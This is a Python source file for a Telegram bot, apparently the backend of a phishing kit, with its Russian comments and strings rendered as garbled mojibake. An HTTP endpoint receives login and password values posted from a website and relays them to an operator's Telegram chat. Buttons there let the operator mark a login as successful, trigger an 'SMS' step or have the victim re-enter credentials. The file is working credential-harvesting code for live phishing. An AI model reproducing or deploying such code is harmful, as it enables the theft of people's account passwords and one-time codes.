from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from aiohttp import web
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID"))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—Ö–æ–¥—è—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö —Å —Å–∞–π—Ç–∞
async def handle_form(request):
    data = await request.post()
    login = data.get("login", "‚Äî")
    password = data.get("password", "‚Äî")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("‚úÖ –£—Å–ø–µ—Ö", callback_data="success")],
        [InlineKeyboardButton("‚úâÔ∏è SMS", callback_data="sms")],
        [InlineKeyboardButton("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ", callback_data=f"wrong:{login}:{password}")]
    ])

    msg = f"üîê –ù–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ —Å —Å–∞–π—Ç–∞:\nüë§ –õ–æ–≥–∏–Ω: <code>{login}</code>\nüîë –ü–∞—Ä–æ–ª—å: <code>{password}</code>"
    await bot.send_message(ADMIN_CHAT_ID, msg, parse_mode="HTML", reply_markup=keyboard)
    return web.Response(text="OK")

@dp.callback_query_handler(lambda c: c.data.startswith("wrong"))
async def handle_wrong(callback: types.CallbackQuery):
    _, login, password = callback.data.split(":")
    await callback.message.answer("üîÅ –ü–æ–ø—Ä–æ—Å–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤–≤–µ—Å—Ç–∏ –¥–∞–Ω–Ω—ã–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ.")
    # —Ç—É—Ç –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∏–ª–∏ API-–∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–∞–π—Ç

@dp.callback_query_handler(lambda c: c.data == "success")
async def handle_success(callback: types.CallbackQuery):
    await callback.answer("‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥!")

@dp.callback_query_handler(lambda c: c.data == "sms")
async def handle_sms(callback: types.CallbackQuery):
    await callback.answer("üì® –û—Ç–ø—Ä–∞–≤–∫–∞ SMS...")

# HTTP-—Å–µ—Ä–≤–µ—Ä –¥–ª—è Render.com
async def on_startup(dp):
    app = web.Application()
    app.router.add_post("/send", handle_form)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", 8080)))
    await site.start()

if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
